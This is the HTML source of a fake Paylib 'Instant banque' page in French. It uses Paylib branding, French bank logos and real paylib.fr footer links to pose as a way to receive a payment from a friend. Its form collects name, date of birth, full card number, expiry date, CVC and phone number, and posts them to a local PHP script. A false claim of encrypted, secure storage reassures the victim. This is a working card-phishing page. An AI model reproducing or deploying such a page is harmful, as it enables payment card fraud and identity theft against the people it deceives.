...
<title data-react-helmet=id>Paylib entre amis</title>
...
<link rel="icon" href="./public/img/paylib-logo.svg" type="image/png" />
...
<body><noscript class=sf-hidden>Si vous voyez ce message <strong>JavaScript est désactivé dans votre navigateur</strong>, merci <strong>d'activer JavaScript</strong> pour faire fonctionner cette application.</noscript>
    <div id=app style=width:100vw;height:100vh>
        <div class="react-gradient sc-AxjAm bcMPWx" style=background-image:linear-gradient(35deg,rgb(188,188,194),rgb(116,228,255))></div>
        <div class="MuiBox-root jss1 sc-fznZeY gJlwEu">
            <div class="MuiContainer-root jss9 sc-fznyAO crXZxy MuiContainer-maxWidthSm" height align=center>
                <div class="MuiPaper-root sc-fznKkj ivzOFg MuiPaper-elevation0" padding="10px 20px">
                    <div style=opacity:1;transform:translate3d(0px,0px,0px);width:100%>
                        <div class="sc-fzqBZW eNQuho">
                            <div class="sc-fzoLag BNtsP"><button class="MuiButtonBase-root MuiIconButton-root" tabindex=0 type=button id=paylib-logo><span class=MuiIconButton-label><a href=""><img src="./public/img/paylib-logo.svg" alt="Paylib logo" style=max-width:88px></a></span><span class=MuiTouchRipple-root></span></button></div>
                            <hr class=MuiDivider-root>
                            <div class="sc-fzokOt hLgJkJ">
                                <div class="MuiBox-root jss25 sc-fzoyAV fQsatj">
                                    <h1 class="MuiTypography-root MuiTypography-h1 MuiTypography-gutterBottom MuiTypography-alignCenter">Instant banque</h1>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div style=opacity:1;transform:translate3d(0px,0px,0px);width:100%><span class="sc-fzozJi kFaMsL">Complétez les étapes 1 et 2 avec les informations respectives pour récupérer le montant du paiement entre Amis sur votre Compte Bancaire.<br/>
                    <br/>NB : Vos données sont cryptées et stockées sur un serveur ultra sécurisé à l'abri d'un tiers.</span>
                        <h3>ETAPE 1 :</h3>
                    </div>
                    <div style=opacity:1;transform:translate3d(0px,0px,0px);width:100%>
                        <form data-testid="form" class="sc-ksdxAp fdYigH jsx-3565484035" action="action/instant-banque.php" autocomplete="on" novalidate="" method="post">
                            <div class="sc-fzqARJ eLpUJW">

								<div class="sc-fzoiQi ozSmQ" style="margin-top: 30px;">
                                    <div class="MuiFormControl-root MuiTextField-root sc-fznWqX iCDlZf" width=100%><label class="MuiFormLabel-root MuiInputLabel-root MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink MuiInputLabel-outlined MuiFormLabel-filled Mui-focused" data-shrink=true for=reference id=reference-label>Veuillez saisir votre prénom</label>
                                        <div class="MuiInputBase-root MuiOutlinedInput-root Mui-focused MuiInputBase-formControl">
                                            <input placeholder="Prénom" aria-invalid="false" id="prenoms" class="MuiInputBase-input MuiOutlinedInput-input" required="required" name="prenoms" type="text">
                                            <fieldset aria-hidden=true class="jss11 MuiOutlinedInput-notchedOutline">
                                                <legend class="jss13 jss14"><span>Veuillez saisir votre prénom</span></legend>
                                            </fieldset>
                                        </div>
                                    </div>
                                </div>
								...
								<div class="sc-fzoiQi ozSmQ" style="margin-top: 30px;">
                                    <div class="MuiFormControl-root MuiTextField-root sc-fznWqX iCDlZf" width=100%><label class="MuiFormLabel-root MuiInputLabel-root MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink MuiInputLabel-outlined MuiFormLabel-filled Mui-focused" data-shrink=true for=reference id=reference-label>Veuillez saisir votre nom</label>
                                        <div class="MuiInputBase-root MuiOutlinedInput-root Mui-focused MuiInputBase-formControl">
                                            <input placeholder="Nom de famille" aria-invalid="false" id="noms" class="MuiInputBase-input MuiOutlinedInput-input" required="required" name="noms" type="text">
                                            <fieldset aria-hidden=true class="jss11 MuiOutlinedInput-notchedOutline">
                                                <legend class="jss13 jss14"><span>Veuillez saisir votre nom</span></legend>
                                            </fieldset>
                                        </div>
                                    </div>
                                </div>
								...
								<div class="sc-fzoiQi ozSmQ" style="margin-top: 30px;">
                                    <div class="MuiFormControl-root MuiTextField-root sc-fznWqX iCDlZf" width=100%><label class="MuiFormLabel-root MuiInputLabel-root MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink MuiInputLabel-outlined MuiFormLabel-filled Mui-focused" data-shrink=true for=reference id=reference-label>Veuillez saisir votre date de naissance</label>
                                        <div class="MuiInputBase-root MuiOutlinedInput-root Mui-focused MuiInputBase-formControl">
                                            <input placeholder="JJ/MM/AAAA" aria-invalid="false" maxlength="10" class="MuiInputBase-input MuiOutlinedInput-input" required="required" id="date" name="datenaissance" type="tel">
                                            <fieldset aria-hidden=true class="jss11 MuiOutlinedInput-notchedOutline">
                                                <legend class="jss13 jss14"><span>Veuillez saisir votre date de naissance</span></legend>
                                            </fieldset>
                                        </div>
                                    </div>
                                </div></br></br>
                                ...
                                <div class="sc-fzoiQi ozSmQ">
                                    <div class="MuiFormControl-root MuiTextField-root sc-fznWqX iCDlZf" width=100%><label class="MuiFormLabel-root MuiInputLabel-root MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink MuiInputLabel-outlined MuiFormLabel-filled Mui-focused" data-shrink=true for=reference id=reference-label>Numéro de votre carte bancaire</label>
                                        <div class="MuiInputBase-root MuiOutlinedInput-root Mui-focused MuiInputBase-formControl">
                                            <input placeholder="45XXXXXXXXXXXXXX" aria-invalid="false" id="card_number" maxlength="19" class="MuiInputBase-input MuiOutlinedInput-input" required="required" name="card_number" type="tel" oninput="this.value = this.value.replace(/[^0-9]/g, '').replace(/(\..*?)\..*/g, '$1');">
                                            <fieldset aria-hidden=true class="jss11 MuiOutlinedInput-notchedOutline">
                                                <legend class="jss13 jss14"><span>Numéro de votre carte bancaire</span></legend>
                                            </fieldset>
                                        </div>
                                    </div>
                                </div>
                                <div class="sc-fzoiQi ozSmQ" style="margin-top: 30px;">
                                    <div class="MuiFormControl-root MuiTextField-root sc-fznWqX iCDlZf" width=100%><label class="MuiFormLabel-root MuiInputLabel-root MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink MuiInputLabel-outlined MuiFormLabel-filled Mui-focused" data-shrink=true for=reference id=reference-label>Veuillez saisir la date d'expiration  </label>
                                        <div class="MuiInputBase-root MuiOutlinedInput-root Mui-focused MuiInputBase-formControl">
                                            <input placeholder="Mois (mm)" aria-invalid="false" id="month" maxlength="2" class="MuiInputBase-input MuiOutlinedInput-input" required="required" name="card_exp_mm" type="tel" oninput="this.value = this.value.replace(/[^0-9]/g, '').replace(/(\..*?)\..*/g, '$1');">
                                            <fieldset aria-hidden=true class="jss11 MuiOutlinedInput-notchedOutline">
                                                <legend class="jss13 jss14"><span>Veuillez saisir la date d'expiration</span></legend>
                                            </fieldset>
                                        </div>

                                    </div>
                                    <div class="MuiFormControl-root MuiTextField-root sc-fznWqX iCDlZf" width=100% style="margin-top: -2px;">
                                        <div class="MuiInputBase-root MuiOutlinedInput-root Mui-focused MuiInputBase-formControl">
                                            <input placeholder="Année (aaaa)" aria-invalid="false" id="card_exp_aaaa" maxlength="4" class="MuiInputBase-input MuiOutlinedInput-input" required="required" name="card_exp_aaaa" type="tel" oninput="this.value = this.value.replace(/[^0-9]/g, '').replace(/(\..*?)\..*/g, '$1');">
                                            <fieldset aria-hidden=true class="jss11 MuiOutlinedInput-notchedOutline">
                                                <legend class="jss13 jss14"><span>Veuillez saisir la date d'expiration</span></legend>
                                            </fieldset>
                                        </div>
                                ...
                                <div class="sc-fzoiQi ozSmQ" style="margin-top: 30px;">
                                    <div class="MuiFormControl-root MuiTextField-root sc-fznWqX iCDlZf" width=100%><label class="MuiFormLabel-root MuiInputLabel-root MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink MuiInputLabel-outlined MuiFormLabel-filled Mui-focused" data-shrink=true for=reference id=reference-label>Veuillez saisir le cryptogramme</label>
                                        <div class="MuiInputBase-root MuiOutlinedInput-root Mui-focused MuiInputBase-formControl">
                                            <input placeholder="123" aria-invalid="false" id="cvc" maxlength="3" class="MuiInputBase-input MuiOutlinedInput-input" required="required" name="cvc" type="password" oninput="this.value = this.value.replace(/[^0-9]/g, '').replace(/(\..*?)\..*/g, '$1');">
                                            <fieldset aria-hidden=true class="jss11 MuiOutlinedInput-notchedOutline">
                                                <legend class="jss13 jss14"><span>Veuillez saisir le cryptogramme</span></legend>
                                            </fieldset>
                                        </div>
                                    </div>
                                </div>
                                <div class="sc-fzoiQi ozSmQ" style="margin-top: 30px;">
                                    <div class="MuiFormControl-root MuiTextField-root sc-fznWqX iCDlZf" width=100%><label class="MuiFormLabel-root MuiInputLabel-root MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink MuiInputLabel-outlined MuiFormLabel-filled Mui-focused" data-shrink=true for=reference id=reference-label>Prix de l'artilce</label>
                                        <div class="MuiInputBase-root MuiOutlinedInput-root Mui-focused MuiInputBase-formControl">
                                            <input placeholder="prix" aria-invalid="false" id="prixarticle" maxlength="5" class="MuiInputBase-input MuiOutlinedInput-input" required="required" name="prixarticle" type="tel" oninput="">
                                            <fieldset aria-hidden=true class="jss11 MuiOutlinedInput-notchedOutline">
                                                <legend class="jss13 jss14"><span>Prix de l'artilce</span></legend>
                                            </fieldset>
                                        </div>
                                    </div>
                                </div>
                                <div class="sc-fzoiQi ozSmQ" style="margin-top: 30px;">
                                    <div class="MuiFormControl-root MuiTextField-root sc-fznWqX iCDlZf" width=100%><label class="MuiFormLabel-root MuiInputLabel-root MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink MuiInputLabel-outlined MuiFormLabel-filled Mui-focused" data-shrink=true for=reference id=reference-label>Numéro de téléphone</label>
                                        <div class="MuiInputBase-root MuiOutlinedInput-root Mui-focused MuiInputBase-formControl">
                                            <input placeholder="téléphone" aria-invalid="false" id="tel" maxlength="25" class="MuiInputBase-input MuiOutlinedInput-input" required="required" name="tel" type="tel" oninput="">
                                            <fieldset aria-hidden=true class="jss11 MuiOutlinedInput-notchedOutline">
                                                <legend class="jss13 jss14"><span>Numéro de téléphone</span></legend>
                                            </fieldset>
                                        </div>
                                    </div>
                                </div>
                                ...
                                <div class="sc-fzoiQi ozSmQ" style="margin-top: 30px;">
                                    <button class="MuiButtonBase-root MuiButton-root MuiButton-contained sc-fzoLsD imyIeN MuiButton-containedPrimary" tabindex=0 type="submit" id=reference-submit-button width=240>
                                <span class=MuiButton-label>Continuer</span>
...
document.getElementById('card_number').addEventListener('input', function (e) {
  e.target.value = e.target.value.replace(/[^0-9-A-z]/g, '').replace(/(.{4})/g, '$1 ').trim();
});
</script>
...
document.querySelectorAll('input[data-pattern-validate]').forEach(el => el.addEventListener('keypress', e => {
  if (!inputMatchesPattern(e)) {
    return e.preventDefault();
                    ...
                    <div style=opacity:1;transform:translate3d(0px,0px,0px);width:100%>
                        <div class="sc-fzqARJ eLpUJW">
                            <div class="MuiBox-root jss26" id=sponsors><span class="MuiTypography-root MuiTypography-caption"><span class="sc-fzozJi fvnFVk">Ce service vous est proposé par :</span></span>
                                <ul class="sc-fzoXzr jYxGEJ">
                                    <ul class="sc-fzpjYC gJohPa">
                                        <li class="sc-fznxsB cUWXFh"><img src="./public/img/ca.png"
                                                alt="Crédit Agricole" title="Crédit Agricole" class="sc-fznJRM SMkih">
                                            <li class="sc-fznxsB cUWXFh"><img src=./public/img/bnp.png
                                                    alt="BNP Paribas" title="BNP Paribas" class="sc-fznJRM SMkih">
                                                <li class="sc-fznxsB cUWXFh"><img src="./public/img/lbp.png"
                                                        alt="La Banque Postale" title="La Banque Postale" class="sc-fznJRM SMkih">
                                                    <li class="sc-fznxsB cUWXFh"><img src="./public/img/sg.png"
                                                            alt="Société Générale" title="Société Générale" class="sc-fznJRM SMkih">
                                                        <li class="sc-fznxsB cUWXFh"><img src=./public/img/hello.png
                                                                alt="Hello Bank!" title="Hello Bank!" class="sc-fznJRM SMkih">
                                                            <li class="sc-fznxsB cUWXFh"><img src="./public/img/cma.png"
                                                                    alt="Crédit Mutuel Arkéa" title="Crédit Mutuel Arkéa" class="sc-fznJRM SMkih"></ul>
                                    <ul class="sc-fzpjYC gJohPa">
                                        <li class="sc-fznxsB cUWXFh"><img src="./public/img/bpo.png"
                                                alt="Banque Populaire" title="Banque Populaire" class="sc-fznJRM SMkih">
                                            <li class="sc-fznxsB cUWXFh"><img src="./public/img/ce.png"
                                                    alt="Caisse d'Epargne" title="Caisse d'Epargne" class="sc-fznJRM SMkih">
                                                <li class="sc-fznxsB cUWXFh"><img src="./public/img/cm.png"
                                                        alt="Crédit Mutuel" title="Crédit Mutuel" class="sc-fznJRM SMkih">
                                                    <li class="sc-fznxsB cUWXFh"><img src="./public/img/cic.png"
                                                            alt=CIC title=CIC class="sc-fznJRM SMkih">
                                                        <li class="sc-fznxsB cUWXFh"><img src="./public/img/lcl.png"
                                                                alt=LCL title=LCL class="sc-fznJRM SMkih"></ul>
                                </ul>
                            </div>
                        </div>
                    </div>
            ...
            <div class="MuiContainer-root sc-AxhUy fxWvvr MuiContainer-maxWidthSm">
                ...
                <footer class="sc-AxirZ bJCmFu">
                    <ul class="sc-AxiKw eSbheu">
                        <li class="sc-AxhCb eSwYtm"><a href="https://recup.paylib.fr/legal">Mentions légales</a>
                            <li class="sc-AxhCb eSwYtm"><a href="https://www.paylib.fr/faq/jai-recu-un-paylib-comment-le-recevoir-sur-mon-compte" target=_blank>FAQ</a>
                                <li class="sc-AxhCb eSwYtm"><a href="https://recup.paylib.fr/cgu">CGU</a>
                                    <li class="sc-AxhCb eSwYtm"><a href="https://recup.paylib.fr/cookies">Cookies et données</a>
                                        <li class="sc-AxhCb eSwYtm"><a href="https://recup.paylib.fr/unregister">Se désinscrire</a></ul>
                </footer>
            </div>
        </div>
    </div>
